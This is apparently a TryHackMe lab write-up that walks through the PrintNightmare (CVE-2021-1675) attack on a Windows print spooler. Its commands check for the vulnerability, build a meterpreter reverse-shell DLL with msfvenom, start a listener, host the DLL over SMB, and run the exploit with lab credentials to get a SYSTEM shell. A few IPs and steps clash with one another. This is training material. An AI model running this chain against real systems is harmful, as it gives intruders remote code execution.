# printnightmare-try-hack-me
A Walkthrough of the PrintNightmare vulnerability utilizing the tryhackme environment. 

This is a post compromise attack that takes advantage of the printer spooler. This basic spooler function runs as system privilege. Because it runs as system privilege, this means that any authenticated attacker can run code execution. Although Microsoft has released a patched to mitigate this attack, many bugs don’t always get patched, and this bug will continue to show up for some time.
<br>
<br>


### Environment

- attacker machine: 10.10.217.212
- target machine: 10.10.103.215
<br>
<br>

### CVE-2021-1675 Walkthrough
<br> 
<br>
1. Before running the exploit, create a PrintNightmare director (pn) and a share directory.

```
git clone https://github.com/tryhackme/CVE-2021-1675
```

<br>
<br> 
2. I check if environment is vulnerable

```
rpcdump.py @10.10.103.216 | egrep 'MS-RPRN|MS-PAR'
```
<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn5.png?raw=true" height="80%" width="80%" alt="rpcdump"/>

<br>
<br>
3. msfvenom to generate payload and create malicious .dll

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
```
<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn2.png?raw=true" height="80%" width="80%" alt="msfvenom"/>

<br>
<br>
4. With msfvenom I need to set up meterpreter session on msfconsole using the same payload you used with msfvenom

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.217.212
set lport 4444
run -j
```
<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn3.png?raw=true" height="80%" width="80%" alt="msfconsole"/>

<br>
<br>
5. To host the payload, I use smbserver (a tool from impacket). This is the local folder that will share the malicious.dll. <i> *Make sure to run file share with smb2support to ensure compatibility and effectiveness* </i>

```
smbserver.py share /root/Desktop/share/ -smb2support
```
<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn4.png?raw=true" height="80%" width="80%" alt="smbserver"/>

<br>
<br>
6. Now, everything is set up, I am ready to run the malicious script. Remember that this is a post-compromise attack, so I have domain controller and domain name, and I already have username and password. And then I also have the path to the share file.

```
python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.103.215 '\\10.10.217.212\share\malicious.dll'
```
<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn6.png?raw=true" height="80%" width="80%" alt="exploit"/>


<br>
<br>
7. I have a meterpreter shell
<br>
<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn8.png?raw=true" height="80%" width="80%" alt="meterpretershell"/>

<br>
<br>
7. And because this is a tryhackme CTF, I navigate to find the flag
<br>
<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn9.png?raw=true" height="80%" width="80%" alt="meterpretershell"/> <br/>
<br />

<img src="https://github.com/trixiahorner/printnightmare-try-hack-me/blob/main/images/pn9.2.png?raw=true" height="80%" width="80%" alt="meterpretershell"/> <br/>


